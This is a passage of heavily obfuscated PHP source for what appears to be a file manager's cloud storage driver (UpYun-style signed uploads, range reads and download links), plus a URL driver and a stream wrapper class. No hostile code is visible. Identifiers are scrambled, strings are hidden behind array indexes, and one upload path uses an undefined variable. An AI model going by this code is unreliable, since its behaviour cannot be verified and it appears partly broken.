$€¹ŸÁº’[$ƒ¥·Ã¤¶[1281]]; } private function fileList($¨ü¸ã¨, &$Èï¨µèÈ, &$Òã†êêŠ, $öã€Ğ›À = false) { $ÆË©é =& $_SERVER[÷åé¼î]; $Ï„İÛÓÄ = $ÆË©é[12]; $•ßŸ£‰ñ = 1000; $ºç¾Å = rtrim($¨ü¸ã¨, $ÆË©é[8]) . $ÆË©é[8]; while (!0) { check_abort(); $‡¤æœÍ‰ = $this->listObjs($¨ü¸ã¨, $Ï„İÛÓÄ, $•ßŸ£‰ñ); if (!$‡¤æœÍ‰) { return !1; } $Ï„İÛÓÄ = isset($‡¤æœÍ‰[$ÆË©é[1583]]) ? $‡¤æœÍ‰[$ÆË©é[1583]] : $ÆË©é[12]; $Êº…†ÜÖ = isset($‡¤æœÍ‰[$ÆË©é[1584]]) ? $‡¤æœÍ‰[$ÆË©é[1584]] : array(); foreach ($Êº…†ÜÖ as $¯óêıüë) { $üš§İ­œ = $¯óêıüë[$ÆË©é[33]] == $ÆË©é[78] ? !0 : !1; $ª’¿’³İ = ltrim($ºç¾Å . $¯óêıüë[$ÆË©é[32]], $ÆË©é[8]) . ($üš§İ­œ ? $ÆË©é[8] : $ÆË©é[12]); $î±ñø•˜ = array($ÆË©é[32] => $ª’¿’³İ, $ÆË©é[33] => $üš§İ­œ ? $ÆË©é[78] : $ÆË©é[230], $ÆË©é[79] => $¯óêıüë[$ÆË©é[397]], $ÆË©é[1579] => $¯óêıüë[$ÆË©é[1585]]); $this->cacheMethodInfoSet($ª’¿’³İ, $üš§İ­œ, $î±ñø•˜); if ($üš§İ­œ) { $Èï¨µèÈ[] = $ª’¿’³İ; if ($öã€Ğ›À) { $this->fileList($ª’¿’³İ, $Èï¨µèÈ, $Òã†êêŠ, $öã€Ğ›À); } continue; } $Òã†êêŠ[] = $î±ñø•˜; } if (count($Êº…†ÜÖ) < $•ßŸ£‰ñ) { break; } } $this->cacheMethodInfoSet($¨ü¸ã¨, !0); } public function listPath($¿üü¶‹, $«’•¢Ä = false) { $÷˜ù¬À =& $_SERVER[÷åé¼î]; $¨£Œìì¤ = $§»‘ÓŸå = array(); $this->fileList($¿üü¶‹, $¨£Œìì¤, $§»‘ÓŸå); foreach ($¨£Œìì¤ as $ıÕé›œä => $Ò˜ö¿’¦) { $¨£Œìì¤[$ıÕé›œä] = $this->folderInfo($Ò˜ö¿’¦, $«’•¢Ä); } foreach ($§»‘ÓŸå as $ıÕé›œä => $Ò˜ö¿’¦) { $§»‘ÓŸå[$ıÕé›œä] = $this->fileInfo($Ò˜ö¿’¦[$÷˜ù¬À[32]], $«’•¢Ä, $Ò˜ö¿’¦); } return array($÷˜ù¬À[85] => $¨£Œìì¤, $÷˜ù¬À[86] => $§»‘ÓŸå); } public function has($à›“÷şØ, $ˆ™Ïùœš = false, $®µıı®‚ = true) { $Ä´­Ë¿Ö =& $_SERVER[÷åé¼î]; $”¶øÜĞÉ = $Ä´­Ë¿Ö[12]; $ûÀÚ„³ı = 500; $ÁÀ¯–Ç¨ = 0; $‚‡¨È´ = 0; $–¢Ü¸Šİ = rtrim($à›“÷şØ, $Ä´­Ë¿Ö[8]) . $Ä´­Ë¿Ö[8]; while (!0) { check_abort(); $ÂíŸ‘–­ = $this->listObjs($à›“÷şØ, $”¶øÜĞÉ, $ûÀÚ„³ı); if (!$ÂíŸ‘–­) { return !1; } $”¶øÜĞÉ = isset($ÂíŸ‘–­[$Ä´­Ë¿Ö[1583]]) ? $ÂíŸ‘–­[$Ä´­Ë¿Ö[1583]] : $Ä´­Ë¿Ö[12]; $‡ˆõòÄÊ = isset($ÂíŸ‘–­[$Ä´­Ë¿Ö[1584]]) ? $ÂíŸ‘–­[$Ä´­Ë¿Ö[1584]] : array(); if (empty($‡ˆõòÄÊ)) { break; } $ŠšùÂ‚Ø = array_filter($‡ˆõòÄÊ, function ($“¿“ü) { $á°ÓáàÓ =& $_SERVER[÷åé¼î]; return $“¿“ü[$á°ÓáàÓ[33]] == $á°ÓáàÓ[78]; }); $¾Ì²°Â§ = count($‡ˆõòÄÊ); $ŠšùÂ‚Ø = count($ŠšùÂ‚Ø); $ï¶¹İ“  = $¾Ì²°Â§ - $ŠšùÂ‚Ø; if ($ˆ™Ïùœš) { $‚‡¨È´ += $ŠšùÂ‚Ø; $ÁÀ¯–Ç¨ += $ï¶¹İ“ ; if ($¾Ì²°Â§ < $ûÀÚ„³ı) { break; } continue; } if ($®µıı®‚) { if ($ï¶¹İ“ ) { return !0; } } else { if ($ŠšùÂ‚Ø) { return !0; } } if ($¾Ì²°Â§ < $ûÀÚ„³ı) { break; } } if ($ˆ™Ïùœš) { return array($Ä´­Ë¿Ö[239] => $ÁÀ¯–Ç¨, $Ä´­Ë¿Ö[240] => $‚‡¨È´); } return !1; } public function listAll($Õ˜ŸŠ˜­) { $åÁªŸÒÅ =& $_SERVER[÷åé¼î]; $Ú‹Û“–Ù = $è¢Éù·Œ = array(); $this->fileList($Õ˜ŸŠ˜­, $Ú‹Û“–Ù, $è¢Éù·Œ, !0); $»²˜’Äó = array_to_keyvalue($è¢Éù·Œ, $åÁªŸÒÅ[32]); foreach ($Ú‹Û“–Ù as $ıÑ„Àéí) { if (is_string($ıÑ„Àéí)) { $»²˜’Äó[$ıÑ„Àéí] = array($åÁªŸÒÅ[79] => 0); } } return $this->listAllFiles($Õ˜ŸŠ˜­, $»²˜’Äó); } public function canRead($ÍµÖ‰±) { return $this->exist($ÍµÖ‰±) ? !0 : !1; } public function canWrite($ü“›á×Ï) { return $this->exist($ü“›á×Ï) ? !0 : !1; } public function getContent($¨ö•é¿¢) { return $this->fileSubstr($¨ö•é¿¢, 0, -1); } public function setContent($Ğ­Äœİ, $•ŞÏîâØ = '') { $¡œ©İê¼ =& $_SERVER[÷åé¼î]; if (!$•ŞÏîâØ) { $İ…åÓî¥ = $this->ussRequest($Ğ­Äœİ, $¡œ©İê¼[257]); return $İ…åÓî¥[$¡œ©İê¼[1291]]; } $ªµß¬Û÷ = $this->tempFile($this->pathThis($Ğ­Äœİ)); file_put_contents($ªµß¬Û÷, $•ŞÏîâØ); if ($this->upload($Ğ­Äœİ, $ªµß¬Û÷)) { $this->tempFileRemve($ªµß¬Û÷); return !0; } return !1; } public function fileSubstr($ÕÑóò›ë, $øÛã™É, $­óÅü¸Š) { $ÎÜ¤˜÷¨ =& $_SERVER[÷åé¼î]; if (!($•—·ó‰‡ = $this->link($ÕÑóò›ë))) { return !1; } $çµ¼©ˆ¦ = !1; if ($­óÅü¸Š > 0) { $¬¯’‡ª· = $øÛã™É + $­óÅü¸Š - 1; $çµ¼©ˆ¦ = array($ÎÜ¤˜÷¨[1533] . $øÛã™É . $ÎÜ¤˜÷¨[446] . $¬¯’‡ª·); } $åÜ”å÷÷ = url_request($•—·ó‰‡, $ÎÜ¤˜÷¨[261], !1, $çµ¼©ˆ¦); return $åÜ”å÷÷[$ÎÜ¤˜÷¨[815]] ? $åÜ”å÷÷[$ÎÜ¤˜÷¨[1281]] : !1; } public function upload($ÄêÄŞÈ‰, $í˜ƒ‹şã, $À¿‡ÜƒÕ = false, $¾ÔŞÔüğ = REPEAT_REPLACE) { $ŠíğõÍ =& $_SERVER[÷åé¼î]; $ÆÍ®‘Úó = IO::size($í˜ƒ‹şã); if ($ÆÍ®‘Úó <= 1024 * 1024 * 200) { $ÑıöÈ§¹ = array($ŠíğõÍ[1586] . $í˜ƒ‹şã); $ÆÅöñ—ú = $this->ussRequest($ÄêÄŞÈ‰, $ŠíğõÍ[259], $ÑıöÈ§¹); return $ÆÅöñ—ú[$ŠíğõÍ[1291]] ? $this->getPathOuter($ÄêÄŞÈ‰) : !1; } $†„ê‹«Ô = 1024 * 1024 * 10; $ãâø•†¯ = array($ŠíğõÍ[1587], $ŠíğõÍ[1588] . $ÆÍ®‘Úó, $ŠíğõÍ[1589], $ŠíğõÍ[1590] . $†„ê‹«Ô); $ÆÅöñ—ú = $this->ussRequest($ÄêÄŞÈ‰, $ŠíğõÍ[259], !1, $ãâø•†¯); if (!$ÆÅöñ—ú[$ŠíğõÍ[1291]]) { return !1; } $£øÊÇ×± = $ÆÅöñ—ú[$ŠíğõÍ[1281]]; $©øå‘ƒ = 0; $ß”œÎ÷© = $£øÊÇ×±[$ŠíğõÍ[1591]]; $¼àõ¨°ø = fopen($í˜ƒ‹şã, $ŠíğõÍ[1454]); if (!$¼àõ¨°ø) { return !1; } do { $ß´Àøáî = $£øÊÇ×±[$ŠíğõÍ[1592]]; fseek_64($¼àõ¨°ø, $©øå‘ƒ); $˜˜‰ö¬á = fread($¼àõ¨°ø, $ß´Àøáî); $×ÜÃ£ğ¹ = 0; do { $×ÜÃ£ğ¹++; $£øÊÇ×± = $this->uploadPart($ÄêÄŞÈ‰, $£øÊÇ×±, $˜˜‰ö¬á); } while (!$£øÊÇ×± && $×ÜÃ£ğ¹ < 3); if (!$£øÊÇ×±) { return !1; } $ß”œÎ÷© = $£øÊÇ×±[$ŠíğõÍ[1591]]; $©øå‘ƒ += $ß´Àøáî; } while ($ß”œÎ÷© != -1); fclose($¼àõ¨°ø); $ãâø•†¯ = array($ŠíğõÍ[1593], $ŠíğõÍ[1594] . $£øÊÇ×±[$ŠíğõÍ[1595]], $ŠíğõÍ[1589]); $ÆÅöñ—ú = $this->ussRequest($ÄêÄŞÈ‰, $ŠíğõÍ[259], !1, $ãâø•†¯); return $ÆÅöñ—ú[$ŠíğõÍ[1291]] ? $this->getPathOuter($ÏÅÛ¿½­) : !1; } private function uploadPart($éı¶…Øö, $”Œ¨¿æœ, &$²àÃ¾öĞ) { $ÏŒƒúÉƒ =& $_SERVER[÷åé¼î]; $†˜¶à¦ = array($ÏŒƒúÉƒ[1596], $ÏŒƒúÉƒ[1594] . $”Œ¨¿æœ[$ÏŒƒúÉƒ[1595]], $ÏŒƒúÉƒ[1597] . $”Œ¨¿æœ[$ÏŒƒúÉƒ[1591]], $ÏŒƒúÉƒ[146] . $”Œ¨¿æœ[$ÏŒƒúÉƒ[1592]]); $ıœšÂ§Õ = $this->ussRequest($éı¶…Øö, $ÏŒƒúÉƒ[259], $²àÃ¾öĞ, $†˜¶à¦); return !$ıœšÂ§Õ[$ÏŒƒúÉƒ[1291]] ? $ıœšÂ§Õ[$ÏŒƒúÉƒ[1291]] : $ıœšÂ§Õ[$ÏŒƒúÉƒ[1281]]; } public function uploadFormData($äÆñ½Ü€, $ÓÕÜ“·â = 3600) { return $this->uploadPolicy($äÆñ½Ü€, $ÓÕÜ“·â); } public function multiUploadFormData($Óé¾³Ë, $‘±Ú£™© = 3600) { $™ö«÷à¶ =& $_SERVER[÷åé¼î]; $Åú“ÇÅ = (int) $GLOBALS[$™ö«÷à¶[7]][$™ö«÷à¶[79]]; return $this->uploadPolicy($Óé¾³Ë, $‘±Ú£™©, $Åú“ÇÅ); } private function uploadPolicy($‰Äıú¬×, $Ø‡ê‰¬ = 3600, $‘º¸óÏˆ = 0) { $Ê«÷Ò” =& $_SERVER[÷åé¼î]; $ùé¥øê¿ = $Ê«÷Ò”[8] . $this->bucket; $Æï•ŒÏâ = gmdate($Ê«÷Ò”[1491]); $¯Õ¡µî = array($Ê«÷Ò”[1598] => $this->bucket, $Ê«÷Ò”[1599] => $‰Äıú¬×, $Ê«÷Ò”[1600] => time() + $Ø‡ê‰¬, $Ê«÷Ò”[1601] => $Æï•ŒÏâ); if ($‘º¸óÏˆ) { $¯Õ¡µî[$Ê«÷Ò”[1474]] = $‘º¸óÏˆ; } $µö¼í¶² = base64_encode(json_encode($¯Õ¡µî)); $êƒ»ß§Š = base64_encode(hash_hmac($Ê«÷Ò”[1555], "\x50\x4f\x53\124\46{$ùé¥øê¿}\46{$Æï•ŒÏâ}\46{$µö¼í¶²}", md5("{$this->userpass}"), !0)); $Ãöå¸ƒß = array($Ê«÷Ò”[293] => $µö¼í¶², $Ê«÷Ò”[1602] => "\125\x50\131\125\116\x20{$this->username}\x3a{$êƒ»ß§Š}", $Ê«÷Ò”[208] => $this->endpoint . $ùé¥øê¿); return $Ãöå¸ƒß; } public function download($û¥äñÙ, $Öò•£µ¼) { $–¹½øë° = IO::getPathInner(IO::mkfile($Öò•£µ¼)); if (!($ğœ‡›ô = $this->link($û¥äñÙ))) { return !1; } $¥î·ƒÏ = 0; $ú¼«İŠ = 1024 * 200; $ªŒ—„ç‹ = fopen($–¹½øë°, $_SERVER[÷åé¼î][1539]); while (!0) { $ÓèöÆâ = $this->fileSubstr($û¥äñÙ, $¥î·ƒÏ, $ú¼«İŠ); if ($ÓèöÆâ === !1) { return !1; } fwrite($ªŒ—„ç‹, $ÓèöÆâ); $¥î·ƒÏ += $ú¼«İŠ; if (strlen($ÓèöÆâ) < $ú¼«İŠ) { break; } } fclose($ªŒ—„ç‹); return $Öò•£µ¼; } public function link($×²ç„±…, $ÄÏæàÉ¨ = array()) { $ÔÄ¤™Û =& $_SERVER[÷åé¼î]; $×²ç„±… = trim($×²ç„±…, $ÔÄ¤™Û[8]); if (!empty($this->token)) { $´«ìÂàå = strtotime(date($ÔÄ¤™Û[1603])); $©ÊÔÈ¹Ä = substr(md5($this->token . $ÔÄ¤™Û[344] . $´«ìÂàå . $ÔÄ¤™Û[1604] . $×²ç„±…), 12, 8) . $´«ìÂàå; $ÄÏæàÉ¨[] = $ÔÄ¤™Û[1605] . $©ÊÔÈ¹Ä; } $¡ÛŸ¿¿ = !empty($ÄÏæàÉ¨) ? $ÔÄ¤™Û[76] . implode($ÔÄ¤™Û[344], $ÄÏæàÉ¨) : $ÔÄ¤™Û[12]; return $this->getHost() . $ÔÄ¤™Û[8] . $×²ç„±… . $¡ÛŸ¿¿; } public function fileOut($ÌğÌ˜½¢, $äáñ·¸ = false, $õ Œ³ª = false, $‹¬„İ„— = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÌğÌ˜½¢, $äáñ·¸, $õ Œ³ª, $‹¬„İ„—); } if (!$õ Œ³ª) { $õ Œ³ª = $this->pathThis($ÌğÌ˜½¢); } $¥Õû€Ÿ© = $äáñ·¸ ? array($_SERVER[÷åé¼î][1606] . rawurlencode($õ Œ³ª)) : array(); $‹—Ò”‘Ñ = $this->link($ÌğÌ˜½¢, $¥Õû€Ÿ©); $this->fileOutLink($‹—Ò”‘Ñ); } public function fileOutServer($£ù–¿¼Ş, $Ãîƒ¤ƒñ = false, $âÛîÎ‘™ = false, $‡å§±ŸÜ = '') { parent::fileOut($£ù–¿¼Ş, $Ãîƒ¤ƒñ, $âÛîÎ‘™, $‡å§±ŸÜ); } public function fileOutImage($’Óıåœ›, $ÚÂ±ÍíÔ = 250) { $Ÿñ¯·Îà = $this->link($’Óıåœ› . $_SERVER[÷åé¼î][1607] . $ÚÂ±ÍíÔ); $this->fileOutLink($Ÿñ¯·Îà); } public function fileOutImageServer($æ®¾®îç, $‹Î³×Ï = 250) { parent::fileOutImage($æ®¾®îç, $‹Î³×Ï); } public function hashMd5($éèëûØ³) { $ñ”òâÀ =& $_SERVER[÷åé¼î]; $“ƒñ¯…È = $this->_objectMeta($éèëûØ³); return isset($“ƒñ¯…È[$ñ”òâÀ[245]]) ? $“ƒñ¯…È[$ñ”òâÀ[245]] : !1; } public function size($¬–¸ãüö) { $ÜûÔ§ˆÖ = $this->objectMeta($¬–¸ãüö); return $ÜûÔ§ˆÖ ? $ÜûÔ§ˆÖ[$_SERVER[÷åé¼î][79]] : 0; } public function info($®ìöşŒ) { if ($this->isFolder($®ìöşŒ)) { return $this->folderInfo($®ìöşŒ); } else { if ($this->isFile($®ìöşŒ)) { return $this->fileInfo($®ìöşŒ); } } return !1; } public function exist($ÒÈæëĞÌ) { return $this->isFile($ÒÈæëĞÌ) || $this->isFolder($ÒÈæëĞÌ); } public function isFile($á˜­ĞÙç) { return !$this->isFolder($á˜­ĞÙç) && $this->objectMeta($á˜­ĞÙç); } public function isFolder($ìñÆÊ·) { return $this->cacheMethod($_SERVER[÷åé¼î][179], $ìñÆÊ·); } protected function objectMeta($ìº‘¥—«) { return $this->cacheMethod($_SERVER[÷åé¼î][181], $ìº‘¥—«); } protected function _objectMeta($§ªïËô¬) { $¼·Öİ‡ë =& $_SERVER[÷åé¼î]; if ($§ªïËô¬ == $¼·Öİ‡ë[12] || $§ªïËô¬ == $¼·Öİ‡ë[8]) { return array(); } $­¢ûğêá = $this->ussRequest($§ªïËô¬, $¼·Öİ‡ë[1608]); if (!$­¢ûğêá[$¼·Öİ‡ë[1291]]) { return null; } $Ø•§òÒË = isset($­¢ûğêá[$¼·Öİ‡ë[1281]]) ? $­¢ûğêá[$¼·Öİ‡ë[1281]] : array(); if (!isset($Ø•§òÒË[$¼·Öİ‡ë[1609]])) { return null; } $›¹˜çùŠ = array($¼·Öİ‡ë[33] => isset($Ø•§òÒË[$¼·Öİ‡ë[1609]]) ? $Ø•§òÒË[$¼·Öİ‡ë[1609]] : null, $¼·Öİ‡ë[79] => isset($Ø•§òÒË[$¼·Öİ‡ë[1610]]) ? $Ø•§òÒË[$¼·Öİ‡ë[1610]] : null, $¼·Öİ‡ë[245] => isset($Ø•§òÒË[$¼·Öİ‡ë[1611]]) ? $Ø•§òÒË[$¼·Öİ‡ë[1611]] : null, $¼·Öİ‡ë[1578] => isset($Ø•§òÒË[$¼·Öİ‡ë[1612]]) ? $Ø•§òÒË[$¼·Öİ‡ë[1612]] : null); $›¹˜çùŠ[$¼·Öİ‡ë[1579]] = isset($Ø•§òÒË[$¼·Öİ‡ë[1613]]) ? strtotime($Ø•§òÒË[$¼·Öİ‡ë[1613]]) : $›¹˜çùŠ[$¼·Öİ‡ë[1578]]; return $›¹˜çùŠ; } protected function _isFolder($Ô†ËĞÖÕ) { $ÉŒÜì£ß =& $_SERVER[÷åé¼î]; if ($Ô†ËĞÖÕ == $ÉŒÜì£ß[12] || $Ô†ËĞÖÕ == $ÉŒÜì£ß[8]) { return !0; } $ÊÒè÷¶é = $this->_objectMeta($Ô†ËĞÖÕ); return isset($ÊÒè÷¶é[$ÉŒÜì£ß[33]]) && $ÊÒè÷¶é[$ÉŒÜì£ß[33]] == $ÉŒÜì£ß[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Í£ğÓí™ = false) { } public function exist($ßĞ—û–×) { $¹Úƒƒ½Ÿ = $this->info($ßĞ—û–×); return $¹Úƒƒ½Ÿ[$_SERVER[÷åé¼î][232]]; } public function isFile($ÑÉ½ß¿Æ) { $ìÓõı± = $this->info($ÑÉ½ß¿Æ); return $ìÓõı±[$_SERVER[÷åé¼î][232]]; } public function isFolder($ÈÌ†ÁœÉ) { return !1; } public function size($µ‰ÉÄåµ) { $õ€º¨ÇÇ = $this->info($µ‰ÉÄåµ); return $õ€º¨ÇÇ[$_SERVER[÷åé¼î][79]]; } public function info($äØ»³ÁÊ) { return $this->infoParse($äØ»³ÁÊ); } public function infoAuth($¾ì®äÆ) { return $this->infoParse($¾ì®äÆ); } public function infoWithChildren($Ü¡öè»Ÿ) { return $this->infoParse($Ü¡öè»Ÿ); } public function infoFull($ š±ªÓõ) { return $this->infoParse($ š±ªÓõ); } private function infoParse($¡µ™Á„ì) { $ãÀ”º°™ =& $_SERVER[÷åé¼î]; $úÛÊçÃª = $this->header($¡µ™Á„ì); if (!$úÛÊçÃª || !$úÛÊçÃª[$ãÀ”º°™[815]]) { return !1; } $Ñö†ü¡ = _get($úÛÊçÃª, $ãÀ”º°™[397], 0); $Ë¸ÌÇ¢Ù = array($ãÀ”º°™[32] => $úÛÊçÃª[$ãÀ”º°™[32]], $ãÀ”º°™[87] => $¡µ™Á„ì, $ãÀ”º°™[33] => $ãÀ”º°™[230], $ãÀ”º°™[79] => intval($Ñö†ü¡), $ãÀ”º°™[169] => get_path_ext($úÛÊçÃª[$ãÀ”º°™[32]]), $ãÀ”º°™[1451] => $Ñö†ü¡ > 0 && $úÛÊçÃª[$ãÀ”º°™[1614]], $ãÀ”º°™[1452] => !1); return $Ë¸ÌÇ¢Ù; } private function header($íÏ™×÷°) { $¥ïœ§¸´ =& $_SERVER[÷åé¼î]; if (isset(self::$_cacheHeader[$íÏ™×÷°])) { return self::$_cacheHeader[$íÏ™×÷°]; } $ÄğŠìÏç = isset($GLOBALS[$¥ïœ§¸´[1615]]) ? $GLOBALS[$¥ïœ§¸´[1615]] : !1; $GLOBALS[$¥ïœ§¸´[1615]] = !0; self::$_cacheHeader[$íÏ™×÷°] = url_header($íÏ™×÷°); $GLOBALS[$¥ïœ§¸´[1615]] = $ÄğŠìÏç; return self::$_cacheHeader[$íÏ™×÷°]; } public function hashSimple($ÌëˆÔ¢, $ ¼ƒ¨„û = false) { $ï’à—¸ò =& $_SERVER[÷åé¼î]; $íÍà¦¸İ = $this->info($ÌëˆÔ¢); if (!$íÍà¦¸İ || !$íÍà¦¸İ[$ï’à—¸ò[232]]) { return !1; } $ÇÍ„ºà¿ = $íÍà¦¸İ[$ï’à—¸ò[79]]; $×åšÊä¼ = 200; $Š™˜ñú¢ = 50; if ($ÇÍ„ºà¿ <= $×åšÊä¼ * $Š™˜ñú¢) { return md5($this->fileSubstr($ÌëˆÔ¢, 0, $ÇÍ„ºà¿)) . $ÇÍ„ºà¿; } $û²İÅÆ = intval($ÇÍ„ºà¿ / $Š™˜ñú¢); $–Éƒı¥¦ = $ï’à—¸ò[12]; $“Ş‘ï¨ß = timeFloat(); $Á¢ â÷¿ = 15; for ($ŠÅ¹öôß = 0; $ŠÅ¹öôß < $Š™˜ñú¢; $ŠÅ¹öôß++) { if (timeFloat() - $“Ş‘ï¨ß > $Á¢ â÷¿) { return !1; } $¢Ëñ’üÑ = $this->fileSubstr($ÌëˆÔ¢, $û²İÅÆ * $ŠÅ¹öôß, $×åšÊä¼); if (!$¢Ëñ’üÑ) { return !1; } $–Éƒı¥¦ .= $¢Ëñ’üÑ; } $–Éƒı¥¦ .= $this->fileSubstr($ÌëˆÔ¢, $ÇÍ„ºà¿ - $×åšÊä¼, $×åšÊä¼); return md5($–Éƒı¥¦) . $ÇÍ„ºà¿; } public function getContent($ãâËõ¸™) { return $this->fileSubstr($ãâËõ¸™); } public function fileSubstr($ÙŞ¸Åê, $ƒŒ„êÕ¬ = 0, $í—«û»Ü = -1) { $ãÓÚÇŞµ =& $_SERVER[÷åé¼î]; $¤‘´ºĞß = $this->info($ÙŞ¸Åê); if (!$¤‘´ºĞß || !$¤‘´ºĞß[$ãÓÚÇŞµ[232]] && $¤‘´ºĞß[$ãÓÚÇŞµ[79]] > 1024 * 1024 * 10) { return !1; } if ($í—«û»Ü === -1) { $í—«û»Ü = $¤‘´ºĞß[$ãÓÚÇŞµ[79]]; } if ($í—«û»Ü == 0) { return $ãÓÚÇŞµ[12]; } $æªÆÅüœ = array($ãÓÚÇŞµ[1616] . $ƒŒ„êÕ¬ . $ãÓÚÇŞµ[850] . ($ƒŒ„êÕ¬ + $í—«û»Ü - 1)); $¶É¼Ü©È = url_request($ÙŞ¸Åê, $ãÓÚÇŞµ[261], !1, $æªÆÅüœ, !1, !1, 30); return $¶É¼Ü©È[$ãÓÚÇŞµ[1281]] ? $¶É¼Ü©È[$ãÓÚÇŞµ[1281]] : $ãÓÚÇŞµ[12]; } public function download($®±ÏËğ¹, $ş–ıä—Ş) { Downloader::start($®±ÏËğ¹, $ş–ıä—Ş); return $ş–ıä—Ş; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÜË¡òôÒ, $á³Èåª£ = '') { $this->info = $this->info($ÜË¡òôÒ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[÷åé¼î][87]]; $this->pathOpen = $ÜË¡òôÒ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÜË¡òôÒ])) { self::$_chunkBuffer[$ÜË¡òôÒ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¤ÆÕâå) { $ü–ï¯Ğ = $this->fileSubstr($this->pose, $¤ÆÕâå); $this->pose += strlen($ü–ï¯Ğ); return $ü–ï¯Ğ; } public function stream_tell() { return $this->pose; } public function stream_seek($Î¨–¼Êî, $ˆĞµ¨) { $„“¸º˜Õ =& $_SERVER[÷åé¼î]; if ($ˆĞµ¨ == SEEK_SET) { $this->pose = $Î¨–¼Êî; } else { if ($ˆĞµ¨ == SEEK_CUR) { $this->pose += $Î¨–¼Êî; } else { if ($ˆĞµ¨ == SEEK_END) { $this->pose = $this->info[$„“¸º˜Õ[79]] + intval($Î¨–¼Êî); } } } if ($Î¨–¼Êî < 0) { $this->pose = $this->info[$„“¸º˜Õ[79]] + $Î¨–¼Êî; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[÷åé¼î][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($°—µ€·Ê, $æ“¨ä”¾) { $ÓÙÅ¾‰ï =& $_SERVER[÷åé¼î]; $Öâ­™‚ = $this->info($°—µ€·Ê); return array($ÓÙÅ¾‰ï[1617] => 0, $ÓÙÅ¾‰ï[1618] => 0, $ÓÙÅ¾‰ï[16] => 32768 + 511, $ÓÙÅ¾‰ï[1619] => 0, $ÓÙÅ¾‰ï[1620] => 0, $ÓÙÅ¾‰ï[1621] => 0, $ÓÙÅ¾‰ï[1622] => 0, $ÓÙÅ¾‰ï[79] => $Öâ­™‚[$ÓÙÅ¾‰ï[79]], $ÓÙÅ¾‰ï[1623] => $Öâ­™‚[$ÓÙÅ¾‰ï[1450]], $ÓÙÅ¾‰ï[1579] => $Öâ­™‚[$ÓÙÅ¾‰ï[88]], $ÓÙÅ¾‰ï[1578] => $Öâ­™‚[$ÓÙÅ¾‰ï[231]], $ÓÙÅ¾‰ï[1624] => 0, $ÓÙÅ¾‰ï[1625] => 0); } static $fileInfo = array(); public function info($Ÿ·€˜Ã) { $‰İ‹™—½ = $_SERVER[÷åé¼î][1626]; if (isset(self::$fileInfo[$Ÿ·€˜Ã])) { return self::$fileInfo[$Ÿ·€˜Ã]; } if (substr($Ÿ·€˜Ã, 0, strlen($‰İ‹™—½)) != $‰İ‹™—½) { return !1; } self::$fileInfo[$Ÿ·€˜Ã] = IO::info(substr($Ÿ·€˜Ã, strlen($‰İ‹™—½))); return self::$fileInfo[$Ÿ·€˜Ã]; } public static function read($Êƒ¸Øñò, $«Ó…Ğğ, $õ‘´Ï»ë) { if (!isset(self::$_fopenCache[$Êƒ¸Øñò])) { $…òŒÉÇ = new StreamWrapperIO(); $…òŒÉÇ->stream_open($Êƒ¸Øñò); self::$_fopenCache[$Êƒ¸Øñò] = $…òŒÉÇ; } $…òŒÉÇ = self::$_fopenCache[$Êƒ¸Øñò]; return $…òŒÉÇ->fileSubstr($«Ó…Ğğ, $õ‘´Ï»ë); } public static function _read($‚ôí»ˆå, $‡ª¾†Í, $…µõ§ñ©) { $³ÜÜÁâ =& $_SERVER[÷åé¼î]; $§åõùŒ© = fopen($‚ôí»ˆå, $³ÜÜÁâ[1454]); if (!$§åõùŒ©) { return $³ÜÜÁâ[12]; } $­î«÷ê = 8192; fseek($§åõùŒ©, $‡ª¾†Í, SEEK_SET); $ÌœÏÃ¿ = $³ÜÜÁâ[12]; $½Òî¾–ù = 0; while ($½Òî¾–ù < $…µõ§ñ©) { $³ç„±Õù = min($­î«÷ê, $…µõ§ñ© - $½Òî¾–ù); $ÌœÏÃ¿ .= fread($§åõùŒ©, $³ç„±Õù); $½Òî¾–ù += $³ç„±Õù; } fclose($§åõùŒ©); return $ÌœÏÃ¿; } public function fileSubstr($ƒ¥¯°¾ß, $ß”¢‘•Ÿ) { $òÎíï™¶ =& $_SERVER[÷åé¼î]; $¸­¬´®” = $this->info[$òÎíï™¶[79]]; $½ì€©®Ã = $ƒ¥¯°¾ß; $œÃ¾œ²í = $ß”¢‘•Ÿ; if ($ƒ¥¯°¾ß < 0) { $ƒ¥¯°¾ß = $¸­¬´®” + $ƒ¥¯°¾ß; } if ($ß”¢‘•Ÿ === !1) { $ß”¢‘•Ÿ = $¸­¬´®” - $ƒ¥¯°¾ß; } if ($ƒ¥¯°¾ß + $ß”¢‘•Ÿ > $¸­¬´®”) { $ß”¢‘•Ÿ = $¸­¬´®” - $ƒ¥¯°¾ß; } if ($ß”¢‘•Ÿ <= 0) { return $òÎíï™¶[12]; } if ($ƒ¥¯°¾ß < 0 || $ƒ¥¯°¾ß >= $¸­¬´®” || $ß”¢‘•Ÿ <= 0 || $ß”¢‘•Ÿ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\x65\x52\x65\141\144\40\145\x72\x72\157\x72\x21\40\x73\164\x61\x72\x74\x3d{$ƒ¥¯°¾ß}\73\x6c\145\156\147\x74\x68\75{$ß”¢‘•Ÿ}\73\40\x73\151\x7a\145\75{$¸­¬´®”}\x3b"); } $ÓóÃõ¨» = 64 * 1024; $Œ®®€ó° =& self::$_chunkBuffer[$this->path]; if (!$Œ®®€ó°) { $Œ®®€ó° = array(); } $ø¾°ù° = 0; $èûìˆ©œ = 0; $ÛÜÀ°†ç = $òÎíï™¶[12]; foreach ($Œ®®€ó° as $ø¾°ù° => $ÛÜÀ°†ç) { $ø¾°ù° = intval($ø¾°ù°); $èûìˆ©œ = $ø¾°ù° + strlen($ÛÜÀ°†ç); if ($ƒ¥¯°¾ß >= $èûìˆ©œ) { continue; } if ($ƒ¥¯°¾ß >= $ø¾°ù° && $ƒ¥¯°¾ß + $ß”¢‘•Ÿ <= $èûìˆ©œ) { return substr($ÛÜÀ°†ç, 